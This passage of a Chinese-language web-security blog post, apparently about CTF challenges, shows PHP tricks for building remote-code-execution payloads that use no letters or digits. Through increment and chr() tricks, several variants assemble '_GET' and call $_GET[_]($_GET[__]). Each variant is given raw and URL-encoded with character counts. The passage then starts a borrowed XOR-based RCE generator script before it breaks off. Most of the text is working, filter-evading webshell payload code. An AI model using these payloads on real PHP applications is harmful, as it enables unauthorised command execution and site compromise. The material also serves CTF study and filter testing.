</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">==</span><span class="s1">&#39;$&#39;</span><span class="p">];</span><span class="o">//</span><span class="n">A</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">B</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">C</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">D</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">E</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">__</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="n">E</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">F</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">G</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">___</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="n">G</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">T</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">___</span><span class="o">.</span><span class="err">$</span><span class="n">__</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="n">GET</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">var_dump</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="n">_GET</span>
</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="n">_</span><span class="p">](</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="n">__</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="n">_</span><span class="p">](</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="n">__</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">接下来就可以尝试去给</span><span class="n">_和__GET传参</span><span class="err">，这里我们需要把换行的都去掉，然后进行一次</span><span class="n">URL编码</span><span class="err">，因为中间件会解码一次，所以我们构造的</span><span class="n">payload先变成这样</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">==</span><span class="s1">&#39;$&#39;</span><span class="p">];</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">__</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">___</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">___</span><span class="o">.</span><span class="err">$</span><span class="n">__</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="n">_</span><span class="p">](</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="n">__</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="sa">B</span><span class="s1">&#39;&#39;</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="s1">&#39;%24&#39;</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">__</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">___</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">___</span><span class="o">.%</span><span class="mi">24</span><span class="n">__</span><span class="o">.%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="s1">&#39;_&#39;</span><span class="o">.%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B_</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="p">(</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B__</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>118字符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="n">Array</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">__</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="o">//</span><span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="o">//</span><span class="n">A</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="n">B</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_1</span><span class="o">=++</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="o">//</span><span class="err">$</span><span class="n">_1</span><span class="o">=</span><span class="n">C</span><span class="p">,</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">D</span><span class="p">(</span><span class="n">这里是前缀</span><span class="o">++</span><span class="err">，</span><span class="n">即先自增一再赋值</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="o">//</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">H</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="err">$</span><span class="n">_1</span><span class="o">.++</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="err">$</span><span class="n">__</span><span class="p">;</span><span class="o">//</span><span class="n">CHr</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">_</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span><span class="o">//</span><span class="n">_GET</span>
</span></span><span class="line"><span class="cl"><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="o">//</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">.</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">__</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B1</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B0</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24_1</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">%</span><span class="mf">24_1.</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">.%</span><span class="mi">24</span><span class="n">__</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">3</span><span class="n">D_</span><span class="o">.%</span><span class="mi">24</span><span class="n">_</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.%</span><span class="mi">24</span><span class="n">_</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.%</span><span class="mi">24</span><span class="n">_</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B1</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="p">(</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24</span><span class="n">_</span><span class="o">%</span><span class="mi">5</span><span class="n">B2</span><span class="o">%</span><span class="mi">5</span><span class="n">D</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">20</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>111字符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="p">([]</span><span class="o">.</span><span class="n">_</span><span class="p">){</span><span class="mi">0</span><span class="p">};</span> <span class="o">//</span><span class="n">A</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_1</span><span class="o">=++</span><span class="err">$</span><span class="n">_</span><span class="p">;</span>  <span class="o">//</span><span class="err">$</span><span class="n">_1</span><span class="o">=</span><span class="n">C</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_1</span><span class="o">.=++</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="p">([]</span><span class="o">.</span><span class="n">_</span><span class="p">){</span><span class="mi">1</span><span class="p">};</span> <span class="o">//</span><span class="err">$</span><span class="n">_1</span><span class="o">=</span><span class="n">CHr</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">_</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span> <span class="o">//</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">_GET</span>
</span></span><span class="line"><span class="cl"><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="o">//</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">缩短为一行</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="p">([]</span><span class="o">.</span><span class="n">_</span><span class="p">){</span><span class="mi">0</span><span class="p">};</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_1</span><span class="o">=++</span><span class="err">$</span><span class="n">_</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_</span><span class="o">++</span><span class="p">;</span><span class="err">$</span><span class="n">_1</span><span class="o">.=++</span><span class="err">$</span><span class="n">_</span><span class="o">.</span><span class="p">([]</span><span class="o">.</span><span class="n">_</span><span class="p">){</span><span class="mi">1</span><span class="p">};</span><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="n">_</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="err">$</span><span class="n">_1</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="err">$$</span><span class="n">_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="异或">异或
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。
</span></span></code></pre></td></tr></table>
</div>
</div><p>找了师傅的一个脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
